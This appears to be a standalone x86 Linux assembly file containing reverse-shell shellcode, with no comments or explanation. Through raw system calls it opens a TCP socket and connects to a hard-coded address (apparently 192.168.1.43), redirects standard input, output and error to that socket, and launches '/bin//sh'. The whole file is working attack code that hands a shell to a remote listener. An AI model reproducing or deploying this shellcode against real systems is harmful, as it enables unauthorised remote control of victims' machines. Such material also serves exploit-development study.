global _start

section .text

_start:

	xor eax, eax
	push 0x66
	pop eax

	xor ebx, ebx
	push ebx
	inc ebx
	push ebx
	inc ebx
	push ebx
	mov ecx, esp
	dec ebx

	int 0x80

	push 0x2b01a8c0
	push word 0x03d9
	push word 0x02
	xor ecx, ecx
	mov ecx, esp

	push 0x10
	push ecx
	push eax
	xor ecx, ecx
	mov ecx, esp
	xor eax, eax
	push 0x66
	pop eax
	xor ebx, ebx
	push 0x3
	pop ebx

	int 0x80

	xor ecx, ecx
	push 0x3f
	xor eax, eax
	pop eax

	int 0x80

	inc ecx
	push 0x3f
	xor eax, eax
	pop eax

	int 0x80

	inc ecx
	push 0x3f
	xor eax, eax
	pop eax

	int 0x80

	xor eax, eax
	mov	al, 0x0b
	xor edx, edx	
	push	edx		
	push	0x68732f2f	
	push	0x6e69622f
	xor ebx, ebx	
	mov	ebx, esp
	xor ecx, ecx	
	mov	ecx, edx	

	int	0x80
